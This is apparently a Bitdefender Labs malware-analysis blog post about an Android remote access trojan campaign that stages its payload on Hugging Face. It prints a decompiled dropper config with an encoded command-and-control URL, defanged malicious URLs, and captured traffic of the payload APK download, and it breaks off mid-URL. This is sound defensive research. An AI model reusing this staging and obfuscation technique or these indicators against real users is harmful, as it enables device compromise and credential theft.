---
title: Android Trojan Campaign Uses Hugging Face Hosting for RAT Payload Delivery
url: https://www.bitdefender.com/en-us/blog/labs/android-trojan-campaign-hugging-face-hosting-rat-payload
source: Over Security - Cybersecurity news aggregator
date: 2026-04-09
fetch_date: 2026-04-10T04:46:56.368860
---

# Android Trojan Campaign Uses Hugging Face Hosting for RAT Payload Delivery

* [Company](/en-us/company/ "Company")
* [Blog](/en-us/blog/ "Blog")

[For Home](/en-us/consumer/ "For Home")[For Business](/en-us/business/ "For Business")[For Partners](/en-us/partners/ "For Partners")

[Consumer Insights](/en-us/blog/hotforsecurity/ "Consumer Insights")[Labs](/en-us/blog/labs/ "Labs")[Business Insights](/en-us/blog/businessinsights/ "Business Insights")

[Anti-Malware Research](/en-us/blog/labs/tag/antimalware-research "Anti-Malware Research")

7 min read

# Android Trojan Campaign Uses Hugging Face Hosting for RAT Payload Delivery

[![Alecsandru Cătălin DAJ](https://blogapp.bitdefender.com/labs/content/images/size/w100/2025/03/1000016262.jpg "Alecsandru Cătălin DAJ")](/en-us/blog/labs/author/alecsandru-daj "Alecsandru Cătălin DAJ")[![Silviu STAHIE](https://0.gravatar.com/avatar/c341806f635818bcc6faa8f684e3d9d0?s=64&d=mm&r=g "Silviu STAHIE")](/en-us/blog/labs/author/sstahie "Silviu STAHIE")

[Alecsandru Cătălin DAJ](/en-us/blog/labs/author/alecsandru-daj "Alecsandru Cătălin DAJ")[Silviu STAHIE](/en-us/blog/labs/author/sstahie "Silviu STAHIE")

January 29, 2026

  ![Android Trojan Campaign Uses Hugging Face Hosting for RAT Payload Delivery](https://blogapp.bitdefender.com/labs/content/images/size/w600/2026/01/ChatGPT-Image-Jan-28--2026--05_18_14-PM.png "Android Trojan Campaign Uses Hugging Face Hosting for RAT Payload Delivery")

*Bitdefender researchers have discovered an Android RAT (remote access trojan) campaign that combines social engineering, the resources of the Hugging Face online platform as staging, and extensive use of Accessibility Services to compromise devices.*

What makes this campaign particularly interesting is the attackers’ use of Hugging Face to host malicious payloads, and the scale at which new samples are deployed.

Hugging Face is a widely used online hosting service that provides a home to machine learning models and gives users a place to host their open-source models, datasets, and other development tools that researchers and developers usually need.

Unfortunately, the space Hugging Face offers can also be used by cybercriminals for malicious purposes as the platform doesn’t seem to have meaningful filters that govern what people can upload. They say all uploads [are scanned](https://huggingface.co/docs/hub/en/security-malware) with ClamAV, which is an open-source antivirus engine.

**Key Findings**

* The RAT uses a two-step infection chain that starts with a dropper and is followed by a malicious payload.
* The Hugging Face online service is abused to host and distribute dangerous APKs.
* The attackers use server-side polymorphism by producing new payloads roughly every 15 minutes.
* The Trojan abuses Accessibility Services to obtain persistent visibility and control.
* Attackers use fake system and financial interfaces to steal credentials and lock screen information.
* A centralized command-and-control server (C2) coordinates payload delivery and data exfiltration.

## Initial infection: dropper distribution and deceptive update prompts

The infection chain begins when users download a malicious Android application called *TrustBastion*. In the most likely scenario, a user encounters an advertisement or similar prompt claiming the phone is infected and urging the installation of a security platform, often presented as free and packed with “useful” features.

When its website was online (trustbastion[.]com), it promised to detect scams and fraudulent SMSes, phishing, malware and much more.

The app is actually a dropper and contains no dangerous functionality at first glance.

Once the user manually installs the app, the dropper immediately displays a prompt warning users that an update is required to continue using the application.

The visual elements resemble legitimate Google Play and Android system update dialogs, which increases the chances that victims will comply.

![](https://blogapp.bitdefender.com/labs/content/images/2026/01/data-src-image-f169ae60-e1a2-41de-8e28-d64f085f78c0.jpeg)

## Payload retrieval through legitimate infrastructure

This is where the Hugging Face infrastructure becomes necessary for attackers. Typically, traffic from low-trust domains gets flagged immediately, which is why attackers often will try to use well-established domains that don’t raise suspicions.

Instead of downloading the spyware from a domain controller by a hacker, the dropper starts a network request to an encrypted endpoint hosted at trustbastion[.]com.

```
public final class Config {
    public static final String B_ASSET_APK = "b.apk";
    public static final String B_MAIN_ACTIVITY = "net.falcon878.market.MainActivity";
    public static final String B_PACKAGE = "rgpp.lerlgl.vhrthg";
    // https://www.trustbastion[.]com/xiazz.html
    private static final String DATA_SOURCE_1 = "Eg4OCglAVVUNDQ1UDggPCQ4YGwkOExUUVBkVF1UCExsAAFQSDhcW";
    public static final Config INSTANCE = new Config();
    private static final char OFFSET_CHAR = 'z';

    private Config() {
    }
```

The response doesn’t deliver an APK file. The server returns instead an HTML page that contains a redirect link that points to a Hugging Face repository hosting the actual payload.

```
{
  "request": {
    "timestamp": 1764085704139,
    "method": "GET",
    "url": "https[:]//www.trustbastion[.]com/xiazz.html",
    "host": "www.trustbastion[.]com",
    "path": "/xiazz.html",
    "headers": {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
      "Host": "www.trustbastion[.]com",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip"
    },
    "body_size": 0,
    "body": "",
    "dest_ip": "148.135.44.146",
  },
  "response": {
    "timestamp": 1764085704313,
    "status_code": 200,
    "headers": {
      "Server": "nginx/1.15.11",
      "Date": "Tue, 25 Nov 2025 23:48:23 GMT",
      "Content-Type": "text/html",
      "Content-Length": "82",
      "Last-Modified": "Tue, 11 Nov 2025 02:55:15 GMT",
      "Connection": "keep-alive",
      "ETag": "\"6912a593-52\"",
      "Accept-Ranges": "bytes"
    },
    "body_size": 85,
    "body": "b'https://huggingface[.]co/datasets/xcvqsccm/sfxyt851/resolve/main/b.apk?download=true'"
  }
}
```

Captured network traffic shows that the final APK is downloaded directly from Hugging Face datasets.

```
{
  "request": {
    "timestamp": 1764085704406,
    "method": "GET",
    "url": "https[:]//huggingface[.]co/datasets/xcvqsccm/sfxyt851/resolve/main/b.apk?download=true",
    "host": "huggingface[.]co",
    "path": "/datasets/xcvqsccm/sfxyt851/resolve/main/b.apk?download=true",
    "headers": {
      "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.034)",
      "Host": "huggingface[.]co",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip"
    },
    "body_size": 0,
    "body": "",
    "dest_ip": "143.204.11.112",
    "obf_chain": []
  },
  "response": {
    "timestamp": 1764085704558,
    "status_code": 302,
    "headers": {
      "Content-Type": "text/plain; charset=utf-8",
      "Content-Length": "1188",
      "Connection": "keep-alive",
      "Date": "Tue, 25 Nov 2025 15:48:24 GMT",
      "Location": "https://cdn-lfs-us-1.hf[.]co/repos/a5/0c/a50cf45d8b119af0cc75679c8307b05e29f2bc85b6d0bd55999dd018639f1c72/19f1a6b9ad1a9654e7c78fa2d37a3ec10192b01b636c5fc1995b80bf6f7dcb36?response-content-disposition=attachment%3B+filename*%3DUTF-8%27%27b.apk%3B+filename%3D%22b.apk%22%3B&response-content-type=application%2Fvnd.android.package-archive&Expires=1764089304&Policy=eyJTdGF0ZW1lbnQiOlt7IkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc2NDA4OTMwNH19LCJSZXNvdXJjZSI6Imh0dHBzOi8vY2RuLWxmcy11cy0xLmhmLmNvL3JlcG9zL2E1LzBjL2E1MGNmNDVkOGIxMTlhZjBjYzc1Njc5YzgzMDdiMDVlMjlmMmJjODViNmQwYmQ1NTk5OWRkMDE4NjM5ZjFjNzIvMTlmMWE2YjlhZDFhOTY1NGU3Yzc4ZmEyZDM3YTNlYzEwMTkyYjAxYjYzNmM1ZmMxOTk1YjgwYmY2ZjdkY2IzNj9yZXNwb25zZS1jb250ZW50LWRpc3Bvc2l0aW9uPSomcmVzcG9uc2UtY29udGVudC10eXBlPSoifV19&Signature=Mqc2vLuG17L9PD9eOO96Tbl8S1P6Efgz...